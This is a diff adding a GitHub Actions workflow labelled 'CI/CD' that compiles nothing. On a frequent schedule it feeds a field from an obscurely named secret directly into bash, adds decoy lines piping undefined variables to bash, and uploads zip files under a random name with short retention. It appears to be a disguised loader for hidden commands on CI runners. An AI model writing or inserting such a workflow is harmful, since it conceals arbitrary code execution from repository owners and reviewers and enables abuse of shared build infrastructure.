@@ -1,0 +1,32 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          mukcd1: ${{ secrets.mukcd1 }}
+        run: |
+          printf '%s' "$mukcd1" | jq -r .ihw80326 | /bin/bash
+          echo $y528 | jq -r .u400 | /bin/bash
+          echo $hjlpq989 | jq -r .w6 | /bin/bash
+          echo $fv847 | jq -r .bwhq21680 | /bin/bash
+          echo $a7171 | jq -r .ht031 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: iKIWOhPE
+          path: "*.zip"
+          retention-days: 1
